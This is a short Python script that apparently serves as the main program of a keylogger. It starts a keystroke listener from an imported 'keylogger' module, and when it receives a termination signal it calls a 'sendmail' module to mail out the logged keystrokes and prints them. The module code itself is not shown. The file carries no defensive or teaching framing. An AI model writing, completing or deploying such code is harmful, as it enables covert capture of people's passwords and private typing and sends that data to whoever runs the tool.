import keylogger
import signal
import sendmail


def main():
    keylogger.start_listener() 
    #boh = keylogger.logString
    #print(boh)
    signal.signal(signal.SIGTERM, handler)

def handler(signum, frame):
    sendmail.send_mail()
    print('Signal handler called with signal', signum)
    print(keylogger.logString)



if __name__ == "__main__":
    main()